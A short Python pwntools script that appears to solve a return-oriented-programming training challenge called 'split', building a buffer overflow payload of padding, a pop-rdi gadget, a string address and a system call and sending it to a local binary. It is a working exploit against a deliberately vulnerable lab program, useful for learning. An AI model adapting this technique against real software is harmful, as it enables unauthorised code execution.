from pwn import *

p = process("./split")
junk = 40
useful = p64(0x000000000040074b)
cat = p64(0x0000000000601060)
rdi = p64(0x00000000004007c3)

payload = b"A" * junk + rdi + cat + useful + p64(0x0)

write("payload",payload)

p.sendline(payload)
print(p.recvall())